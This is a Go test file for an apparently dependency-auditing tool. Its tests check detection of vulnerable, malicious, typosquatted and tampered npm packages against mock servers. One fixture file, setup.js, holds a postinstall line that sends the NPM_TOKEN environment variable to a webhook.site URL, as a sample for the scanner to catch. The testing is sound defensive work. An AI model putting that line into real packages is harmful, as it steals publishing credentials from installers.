package engine

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"crypto/sha512"
	"encoding/base64"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/AlejandroMolines/depsentinel/internal/allowlist"
	"github.com/AlejandroMolines/depsentinel/internal/cache"
	"github.com/AlejandroMolines/depsentinel/internal/config"
	"github.com/AlejandroMolines/depsentinel/internal/db"
	"github.com/AlejandroMolines/depsentinel/internal/model"
)

var fixedNow = time.Date(2026, 10, 13, 12, 0, 0, 0, time.UTC)

func makeTarball(t *testing.T, files map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)
	for name, body := range files {
		_ = tw.WriteHeader(&tar.Header{Name: "package/" + name, Mode: 0o644, Size: int64(len(body)), Typeflag: tar.TypeReg})
		_, _ = tw.Write([]byte(body))
	}
	_ = tw.Close()
	_ = gz.Close()
	return buf.Bytes()
}

func sri(b []byte) string {
	s := sha512.Sum512(b)
	return "sha512-" + base64.StdEncoding.EncodeToString(s[:])
}

type world struct {
	osvURL, npmURL string
	tarball        []byte
	osvCalls       int
	osvFail        bool
}

func newWorld(t *testing.T) *world {
	t.Helper()
	w := &world{tarball: makeTarball(t, map[string]string{
		"package.json": `{"name":"sketchy"}`,
		"setup.js":     `require('https').get('https://webhook.site/x?t='+process.env.NPM_TOKEN)`,
	})}
	osvSrv := httptest.NewServer(http.HandlerFunc(func(rw http.ResponseWriter, r *http.Request) {
		w.osvCalls++
		if w.osvFail {
			http.Error(rw, "boom", http.StatusInternalServerError)
			return
		}
		switch {
		case r.URL.Path == "/v1/querybatch":
			var req struct {
				Queries []struct {
					Package struct{ Name string } `json:"package"`
				} `json:"queries"`
			}
			_ = json.NewDecoder(r.Body).Decode(&req)
			var out struct {
				Results []map[string]any `json:"results"`
			}
			for _, q := range req.Queries {
				res := map[string]any{}
				switch q.Package.Name {
				case "lodash":
					res["vulns"] = []map[string]string{{"id": "GHSA-p6mc-m468-83gw", "modified": "2024-01-01T00:00:00Z"}}
				case "evil-pkg":
					res["vulns"] = []map[string]string{{"id": "MAL-2026-1", "modified": "2026-01-01T00:00:00Z"}}
				}
				out.Results = append(out.Results, res)
			}
			_ = json.NewEncoder(rw).Encode(out)
		case r.URL.Path == "/v1/vulns/GHSA-p6mc-m468-83gw":
			_ = json.NewEncoder(rw).Encode(map[string]any{
				"id": "GHSA-p6mc-m468-83gw", "summary": "Prototype Pollution in lodash", "aliases": []string{"CVE-2020-8203"},
				"modified": "2024-01-01T00:00:00Z", "database_specific": map[string]any{"severity": "HIGH"},
				"affected": []map[string]any{{"package": map[string]string{"ecosystem": "npm", "name": "lodash"},
					"ranges": []map[string]any{{"type": "SEMVER", "events": []map[string]string{{"introduced": "0"}, {"fixed": "4.17.19"}}}}}},
			})
		case r.URL.Path == "/v1/vulns/MAL-2026-1":
			_ = json.NewEncoder(rw).Encode(map[string]any{"id": "MAL-2026-1", "summary": "Malicious code in evil-pkg (npm)", "modified": "2026-01-01T00:00:00Z"})
		default:
			http.NotFound(rw, r)
		}
	}))
	t.Cleanup(osvSrv.Close)
	w.osvURL = osvSrv.URL

	npmSrv := httptest.NewServer(http.HandlerFunc(func(rw http.ResponseWriter, r *http.Request) {
		host := "http://" + r.Host
		switch r.URL.Path {
		case "/lodash":
			_, _ = rw.Write([]byte(`{"dist-tags":{"latest":"4.17.21"},"modified":"2026-04-01T00:00:00Z",
			 "time":{"created":"2012-01-01T00:00:00Z","4.17.21":"2021-02-20T00:00:00Z","4.17.15":"2019-07-19T00:00:00Z","modified":"2026-04-01T00:00:00Z"},
			 "versions":{"4.17.15":{"version":"4.17.15","_npmUser":{"name":"jdalton"},"maintainers":[{"name":"jdalton"}]},"4.17.21":{"version":"4.17.21"}}}`))
		case "/sketchy":
			doc := map[string]any{
				"dist-tags": map[string]string{"latest": "1.0.0"},
				"time":      map[string]string{"created": "2026-10-10T00:00:00Z", "1.0.0": "2026-10-12T20:00:00Z"},
				"versions": map[string]any{"1.0.0": map[string]any{
					"version": "1.0.0", "_npmUser": map[string]string{"name": "newguy"}, "maintainers": []map[string]string{{"name": "newguy"}},
					"scripts": map[string]string{"postinstall": "node setup.js"},
					"dist":    map[string]string{"tarball": host + "/sketchy/-/sketchy-1.0.0.tgz", "integrity": sri(w.tarball)},
				}},
			}
			_ = json.NewEncoder(rw).Encode(doc)
		case "/sketchy/-/sketchy-1.0.0.tgz":
			_, _ = rw.Write(w.tarball)
		case "/evil-pkg":
			_, _ = rw.Write([]byte(`{"dist-tags":{"latest":"1.0.0"},"modified":"2026-01-01T00:00:00Z","versions":{"1.0.0":{"version":"1.0.0"}}}`))
		default:
			http.NotFound(rw, r)
		}
	}))
	t.Cleanup(npmSrv.Close)
	w.npmURL = npmSrv.URL
	return w
}

func writeLock(t *testing.T, dir string, sketchyIntegrity string) {
	t.Helper()
	lock := map[string]any{
		"name": "demo", "version": "1.0.0", "lockfileVersion": 3,
		"packages": map[string]any{
			"": map[string]any{"name": "demo", "version": "1.0.0",
				"dependencies":    map[string]string{"lodash": "4.17.15", "sketchy": "^1.0.0", "reactt": "1.0.0"},
				"devDependencies": map[string]string{"dev-only": "^1"}},
			"node_modules/lodash":   map[string]any{"version": "4.17.15", "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.15.tgz", "integrity": "sha512-AAAA"},
			"node_modules/evil-pkg": map[string]any{"version": "1.0.0", "resolved": "https://registry.npmjs.org/evil-pkg/-/evil-pkg-1.0.0.tgz", "integrity": "sha512-BBBB"},
			"node_modules/sketchy": map[string]any{"version": "1.0.0", "resolved": "https://registry.npmjs.org/sketchy/-/sketchy-1.0.0.tgz",
				"integrity": sketchyIntegrity, "hasInstallScript": true},
			"node_modules/reactt":   map[string]any{"version": "1.0.0", "resolved": "https://registry.npmjs.org/reactt/-/reactt-1.0.0.tgz", "integrity": "sha512-CCCC"},
			"node_modules/dev-only": map[string]any{"version": "1.0.0", "dev": true, "resolved": "https://registry.npmjs.org/dev-only/-/dev-only-1.0.0.tgz", "integrity": "sha512-DDDD"},
		},
	}
	b, _ := json.Marshal(lock)
	if err := os.WriteFile(filepath.Join(dir, "package-lock.json"), b, 0o644); err != nil {
		t.Fatal(err)
	}
}

func (w *world) opts(t *testing.T, dir string) Options {
	t.Helper()
	store, err := db.Load("")
	if err != nil {
		t.Fatal(err)
	}
	return Options{
		Dir: dir, Config: config.Default(), Store: store, Cache: cache.New(t.TempDir()),
		Endpoints: config.Endpoints{OSV: w.osvURL, NPM: w.npmURL}, Now: func() time.Time { return fixedNow },
	}
}

func findRule(rep *model.Report, pkg, rule string) *model.Finding {
	for i := range rep.Findings {
		if rep.Findings[i].Package == pkg && rep.Findings[i].Rule == rule {
			return &rep.Findings[i]
		}
	}
	return nil
}

func TestScanEndToEnd(t *testing.T) {
	w := newWorld(t)
	dir := t.TempDir()
	writeLock(t, dir, sri(w.tarball))
	res, err := Scan(context.Background(), w.opts(t, dir))
	if err != nil {
		t.Fatal(err)
	}
	rep := res.Report
	if rep.Incomplete {
		t.Errorf("no debería estar incompleto: %v", rep.Warnings)
	}
	if rep.Summary.Packages != 5 {
		t.Errorf("paquetes: %d", rep.Summary.Packages)
	}
	// CVE de lodash con versión corregida
	if f := findRule(rep, "lodash", "vulnerability"); f == nil || f.Severity != model.SeverityHigh || f.FixedIn != "4.17.19" || f.ID != "GHSA-p6mc-m468-83gw" {
		t.Errorf("lodash: %+v", f)
	}
	// malware detectado por OSV
	if f := findRule(rep, "evil-pkg", "malicious"); f == nil || f.Severity != model.SeverityCritical {
		t.Errorf("evil-pkg: %+v", f)
	}
	// typosquat directo + paquete que no existe en el registry mock
	if f := findRule(rep, "reactt", "typosquat"); f == nil || f.Severity != model.SeverityMedium {
		t.Errorf("reactt: %+v", f)
	}
	if f := findRule(rep, "reactt", "version-anomaly"); f == nil || f.Severity != model.SeverityHigh {
		t.Errorf("reactt inexistente: %+v", f)
	}
	// script de instalación sin patrón peligroso en el comando: aviso informativo
	if f := findRule(rep, "sketchy", "install-script"); f == nil || f.Severity != model.SeverityLow || !strings.Contains(f.Detail, "node setup.js") {
		t.Errorf("sketchy install-script: %+v", f)
	}
	if f := findRule(rep, "sketchy", "fresh-release"); f == nil {
		t.Errorf("sketchy se publicó hace horas: debe avisar de fresh-release")
	}
	if findRule(rep, "sketchy", "suspicious-script") != nil {
		t.Error("sin --deep no se inspecciona el fichero setup.js")
	}
	// los metadatos quedan en el informe
	for _, p := range rep.Packages {
		if p.Name == "lodash" && (p.Meta == nil || p.Meta.Publisher != "jdalton" || p.Recommendation != "update") {
			t.Errorf("lodash meta/recomendación: %+v", p)
		}
		if p.Name == "evil-pkg" && p.Recommendation != "avoid" {
			t.Errorf("evil-pkg: %+v", p)
		}
	}
	if rep.Summary.RiskLevel != "critical" || rep.Summary.BySeverity["critical"] < 1 {
		t.Errorf("resumen: %+v", rep.Summary)
	}
	if rep.Findings[0].Severity != model.SeverityCritical {
		t.Error("los hallazgos deben ir ordenados por severidad")
	}
}

func TestScanDeepFindsExfiltration(t *testing.T) {
	w := newWorld(t)
	dir := t.TempDir()
	writeLock(t, dir, sri(w.tarball))
	o := w.opts(t, dir)
	o.Deep = true
	res, err := Scan(context.Background(), o)
	if err != nil {
		t.Fatal(err)
	}
	f := findRule(res.Report, "sketchy", "suspicious-script")
	if f == nil || f.Severity != model.SeverityCritical || !strings.Contains(f.Detail, "setup.js") {
		t.Fatalf("deep debe detectar la exfiltración: %+v", f)
	}
	if findRule(res.Report, "sketchy", "integrity") != nil {
		t.Error("el hash del lockfile es correcto")
	}
}

func TestScanDeepIntegrityMismatch(t *testing.T) {
	w := newWorld(t)
	dir := t.TempDir()
	writeLock(t, dir, "sha512-"+base64.StdEncoding.EncodeToString(bytes.Repeat([]byte{1}, 64)))
	o := w.opts(t, dir)
	o.Deep = true
	res, err := Scan(context.Background(), o)
	if err != nil {
		t.Fatal(err)
	}
	if f := findRule(res.Report, "sketchy", "integrity"); f == nil || f.Severity != model.SeverityCritical {
		t.Errorf("un tarball distinto al del lockfile debe ser crítico: %+v", res.Report.Findings)
	}
}

func TestScanOSVDownIsIncompleteButContinues(t *testing.T) {
	w := newWorld(t)
	w.osvFail = true
	dir := t.TempDir()
	writeLock(t, dir, sri(w.tarball))
	o := w.opts(t, dir)
	o.HTTP = nil
	res, err := Scan(context.Background(), o)
	if err != nil {
		t.Fatal(err)
	}
	rep := res.Report
	if !rep.Incomplete {
		t.Error("debe marcarse incompleto")
	}
	var warned bool
	for _, x := range rep.Warnings {
		if strings.Contains(x, "OSV") {
			warned = true
		}
	}
	if !warned {
		t.Errorf("falta el aviso sobre OSV: %v", rep.Warnings)
	}
	if findRule(rep, "reactt", "typosquat") == nil {
		t.Error("las reglas locales deben seguir funcionando")
	}
}

func TestScanOfflineUsesOnlyLocalRules(t *testing.T) {
	w := newWorld(t)
	dir := t.TempDir()
	writeLock(t, dir, sri(w.tarball))
	o := w.opts(t, dir)
	o.Offline = true
	res, err := Scan(context.Background(), o)
	if err != nil {
		t.Fatal(err)
	}
	if w.osvCalls != 0 {
		t.Error("offline no debe llamar a OSV")
	}
	if findRule(res.Report, "reactt", "typosquat") == nil || findRule(res.Report, "sketchy", "install-script") == nil {
		t.Errorf("reglas locales: %+v", res.Report.Findings)
	}
	if findRule(res.Report, "lodash", "vulnerability") != nil {
		t.Error("sin conexión no hay CVEs")
	}
}

func TestAllowlistAndProdOnly(t *testing.T) {
	w := newWorld(t)
	dir := t.TempDir()
	writeLock(t, dir, sri(w.tarball))
	o := w.opts(t, dir)
	l := &allowlist.List{}
	_ = l.Add(allowlist.Entry{Name: "reactt", Rule: "typosquat", Reason: "paquete interno de la empresa"})
	_ = l.Add(allowlist.Entry{Name: "evil-pkg", Reason: "genérica: no debe ocultar malware"})
	o.Allowlist = l
	o.ProdOnly = true
	res, err := Scan(context.Background(), o)
	if err != nil {
		t.Fatal(err)
	}
	rep := res.Report
	if findRule(rep, "reactt", "typosquat") != nil {
		t.Error("typosquat permitido")
	}
	if rep.Summary.Suppressed != 1 || rep.Suppressed[0].Allowed == nil || rep.Suppressed[0].Allowed.Reason != "paquete interno de la empresa" {
		t.Errorf("suprimidos: %+v", rep.Suppressed)
	}
	if findRule(rep, "evil-pkg", "malicious") == nil {
		t.Error("una excepción genérica no puede ocultar malware")
	}
	if rep.Summary.Packages != 4 {
		t.Errorf("--prod-only debe excluir dev-only: %d", rep.Summary.Packages)
	}
}

func TestInventoryEcosystemSelection(t *testing.T) {
	dir := t.TempDir()
	writeLock(t, dir, "sha512-x")
	_ = os.WriteFile(filepath.Join(dir, "go.mod"), []byte("module x\n\nrequire github.com/a/b v1.0.0\n"), 0o644)
	o := Options{Dir: dir, Offline: true, Ecosystems: []model.Ecosystem{model.Go}}
	inv, err := BuildInventory(o)
	if err != nil {
		t.Fatal(err)
	}
	if len(inv.Ecosystems) != 1 || inv.Ecosystems[0] != model.Go || len(inv.Packages) != 1 {
		t.Errorf("%+v", inv.Ecosystems)
	}
	o = Options{Dir: dir, Offline: true, NPMLock: "package-lock.json"}
	inv, err = BuildInventory(o)
	if err != nil || len(inv.Ecosystems) != 1 || inv.Ecosystems[0] != model.NPM {
		t.Errorf("--lock debe limitar a npm: %v %+v", err, inv)
	}
	if _, err := BuildInventory(Options{Dir: dir, Offline: true, NPMLock: "no-existe.json"}); err == nil {
		t.Error("un lockfile inexistente es un error")
	}
	// lockfile corrupto: aviso e informe incompleto
	bad := t.TempDir()
	_ = os.WriteFile(filepath.Join(bad, "package-lock.json"), []byte("{no"), 0o644)
	res, err := Scan(context.Background(), Options{Dir: bad, Offline: true})
	if err != nil || !res.Report.Incomplete || len(res.Report.Warnings) == 0 {
		t.Errorf("lockfile corrupto: %v %+v", err, res)
	}
}
